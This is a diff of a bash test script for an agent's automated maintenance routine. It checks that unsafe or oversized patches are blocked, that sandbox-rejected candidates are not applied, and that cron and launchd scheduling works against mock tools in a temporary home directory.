+    routine_expect 'ROUTINE_BLOCKED id=maintenance reason=unsafe-model-patch' 'the shell command run'
+    routine_expect_clean 'the shell command run'
+
+    cp "$routine_mock_state/oversize-chat.json" "$routine_mock_state/response.json"
+    routine_run maintenance
+    routine_expect 'ROUTINE_BLOCKED id=maintenance reason=patch-limit-exceeded' 'the oversized patch run'
+    routine_expect_clean 'the oversized patch run'
+
+    # 隔離検証に失敗した候補はreal treeへ適用しない。
+    cp "$routine_mock_state/sandboxfail-chat.json" "$routine_mock_state/response.json"
+    routine_run maintenance
+    routine_expect 'ROUTINE_FAILED id=maintenance phase=validation' 'the sandbox failure run'
+    routine_expect 'reasoning=rejected' 'the sandbox failure run'
+    grep -Fqx 'status: activ' "$routine_work/$routine_probe" || \
+      fail 'routine fixture: a sandbox-rejected candidate reached the real tree'
+    routine_expect_clean 'the sandbox failure run'
+
+    # 適用直前にHEADが動いたら中止する（mockが応答中に並行commitを作る）。
+    cp "$routine_mock_state/good-chat.json" "$routine_mock_state/response.json"
+    printf 'commit:%s\n' "$routine_work" > "$routine_mock_state/mode"
+    routine_run maintenance
+    routine_expect 'ROUTINE_SKIPPED id=maintenance reason=base-sha-changed' 'the moved HEAD run'
+    grep -Fqx 'status: activ' "$routine_work/$routine_probe" || \
+      fail 'routine fixture: a candidate was applied after HEAD moved'
+    rm -f "$routine_mock_state/mode"
+    routine_base_sha="$(routine_git rev-parse HEAD)"
+
+    # 正常系: 低リスク修復の候補生成 → 隔離検証 → 適用 → 再検証 → scoped commit。
+    routine_run maintenance
+    (( routine_status == 0 )) || fail 'routine fixture: the low-risk repair run exited non-zero'
+    routine_expect 'ROUTINE_OK id=maintenance commit=' 'the low-risk repair run'
+    routine_expect 'reasoning=applied' 'the low-risk repair run'
+    routine_expect 'backup=unconfigured' 'the low-risk repair run'
+    grep -Fqx 'status: active' "$routine_work/$routine_probe" || \
+      fail 'routine fixture: the verified low-risk repair was not applied'
+    [[ "$(routine_git rev-parse HEAD)" != "$routine_base_sha" ]] || \
+      fail 'routine fixture: the verified repair did not create a scoped commit'
+    routine_commit_files="$(routine_git show --name-only --pretty=format: HEAD | grep -c . || true)"
+    [[ "$routine_commit_files" == '1' ]] || \
+      fail 'routine fixture: the routine commit was not scoped to the repaired file'
+    routine_expect_clean 'the low-risk repair run'
+    fi
+    routine_extra_env=()
+  fi
+
+  # --- Scheduler fixture（mock crontab/launchctl・一時HOME） ------------------------------
+  routine_schedule_home="$routine_fixture_dir/home"
+  routine_mock_bin="$routine_fixture_dir/bin"
+  mkdir -p "$routine_schedule_home" "$routine_mock_bin"
+  routine_crontab_state="$routine_fixture_dir/crontab.state"
+  {
+    printf '#!/bin/sh\n'
+    printf 'STATE=%s\n' "$routine_crontab_state"
+    printf 'case "${1:--}" in\n'
+    printf '  -l) [ -f "$STATE" ] && cat "$STATE" || exit 1 ;;\n'
+    printf '  -r) rm -f "$STATE" ;;\n'
+    printf '  *) cat > "$STATE" ;;\n'
+    printf 'esac\n'
+  } > "$routine_mock_bin/crontab"
+  {
+    printf '#!/bin/sh\n'
+    printf 'echo "$@" >> %s\n' "$routine_fixture_dir/launchctl.log"
+    printf 'exit 0\n'
+  } > "$routine_mock_bin/launchctl"
+  chmod +x "$routine_mock_bin/crontab" "$routine_mock_bin/launchctl"
+  schedule_run() {
+    env "${routine_env[@]}" HOME="$routine_schedule_home" PATH="$routine_mock_bin:$PATH" \
+      AGENT_ROUTINE_SCHEDULER_OS="$1" AGENT_DIRECTORY_ROOT="$routine_work" \
+      bash "$routine_work/tools/manage-routine-schedule.sh" --routine maintenance "${@:2}"
+  }
+
+  schedule_output="$(schedule_run Linux --scheduler auto --at 03:00 --print)"
+  printf '%s\n' "$schedule_output" | grep -Eq '^0 3 \* \* \* ' || \
+    fail 'scheduler fixture: the cron render does not schedule 03:00 daily'
+  printf '%s\n' "$schedule_output" | grep -Fq 'run-routine.sh maintenance' || \
+    fail 'scheduler fixture: the cron render does not run the routine executor'
+  printf '%s\n' "$schedule_output" | grep -Fq 'SCHEDULE_PRINTED routine=maintenance scheduler=cron' || \
+    fail 'scheduler fixture: auto on a non-Darwin host did not select cron'
+  [[ ! -f "$routine_crontab_state" ]] || \
+    fail 'scheduler fixture: --print wrote to the crontab'
+
+  schedule_output="$(schedule_run Darwin --scheduler auto --at 03:00 --print)"
+  printf '%s\n' "$schedule_output" | grep -Fq 'SCHEDULE_PRINTED routine=maintenance scheduler=launchd' || \
+    fail 'scheduler fixture: auto on Darwin did not select launchd'
+  printf '%s\n' "$schedule_output" | grep -Fq '<key>StartCalendarInterval</key>' || \
+    fail 'scheduler fixture: the launchd render is missing StartCalendarInterval'
+  printf '%s\n' "$schedule_output" | grep -Fq '<integer>3</integer>' || \
+    fail 'scheduler fixture: the launchd render does not schedule hour 3'
+  if find "$routine_schedule_home" -name '*.plist' -print -quit 2>/dev/null | grep -q .; then
+    fail 'scheduler fixture: --print wrote a LaunchAgent plist'
+  fi
+
+  # cron installの冪等性と、無関係entryの保全。
+  printf '0 5 * * * /usr/bin/true # unrelated entry\n' > "$routine_crontab_state"
+  schedule_run Linux --scheduler auto --at 03:00 --install >/dev/null
+  schedule_run Linux --scheduler auto --at 03:00 --install >/dev/null
+  routine_managed_count="$(grep -cF '# agent-directory routine=maintenance' "$routine_crontab_state" || true)"
+  [[ "$routine_managed_count" == '1' ]] || \
+    fail 'scheduler fixture: repeated cron installs duplicated the managed entry'
+  grep -Fq '# unrelated entry' "$routine_crontab_state" || \
+    fail 'scheduler fixture: cron install dropped an unrelated entry'
+  schedule_run Linux --scheduler auto --status 2>/dev/null | grep -Fq 'installed=true' || \
+    fail 'scheduler fixture: cron status did not report the installed schedule'
+  schedule_run Linux --scheduler auto --remove >/dev/null
+  if grep -Fq '# agent-directory routine=maintenance' "$routine_crontab_state"; then
+    fail 'scheduler fixture: cron remove left the managed entry'
+  fi
+  grep -Fq '# unrelated entry' "$routine_crontab_state" || \
+    fail 'scheduler fixture: cron remove dropped an unrelated entry'
+
+  # launchd installの冪等性（一時HOME・mock launchctl）。
+  schedule_run Darwin --scheduler auto --at 03:00 --install >/dev/null
+  schedule_run Darwin --scheduler auto --at 03:00 --install >/dev/null
+  routine_plist_count="$(find "$routine_schedule_home/Library/LaunchAgents" -name '*.plist' 2>/dev/null | grep -c . || true)"
+  [[ "$routine_plist_count" == '1' ]] || \
+    fail 'scheduler fixture: repeated launchd installs did not stay idempotent'
+  grep -q 'bootstrap' "$routine_fixture_dir/launchctl.log" || \
+    fail 'scheduler fixture: launchd install did not bootstrap the user agent'
+  schedule_run Darwin --scheduler auto --status 2>/dev/null | grep -Fq 'installed=true' || \
+    fail 'scheduler fixture: launchd status did not report the installed schedule'
+  schedule_run Darwin --scheduler auto --remove >/dev/null
+  if find "$routine_schedule_home/Library/LaunchAgents" -name '*.plist' 2>/dev/null | grep -q .; then
+    fail 'scheduler fixture: launchd remove left the plist'
+  fi
+  grep -q 'bootout' "$routine_fixture_dir/launchctl.log" || \
+    fail 'scheduler fixture: launchd remove did not boot out the user agent'
+
+  # fixture全体が実repoと実OS scheduleへ触れていないこと。
+  if [[ -n "$real_head_before_routine_fixture" ]]; then
+    [[ "$(git -C "$repo_root" rev-parse HEAD)" == "$real_head_before_routine_fixture" ]] || \
+      fail 'routine fixture: the real repository HEAD changed during the fixture run'
   fi
 fi
 
